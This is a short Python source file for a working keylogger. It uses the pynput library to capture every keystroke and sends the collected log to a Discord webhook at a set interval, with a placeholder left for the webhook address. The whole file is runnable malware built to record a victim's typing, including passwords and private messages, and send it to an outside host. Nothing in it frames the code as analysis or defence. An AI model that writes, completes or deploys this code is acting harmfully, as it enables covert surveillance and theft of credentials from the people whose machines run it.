from pynput.keyboard import Listener
from threading import Timer
from dhooks import Webhook

# The URL of the Discord webhook.
WEBHOOK_URL = "" 
# Sets the delay between each report
TIME_INTERVAL = 10  

class Keylogger:
    def __init__(self, webhook_url, interval=60):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()

if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
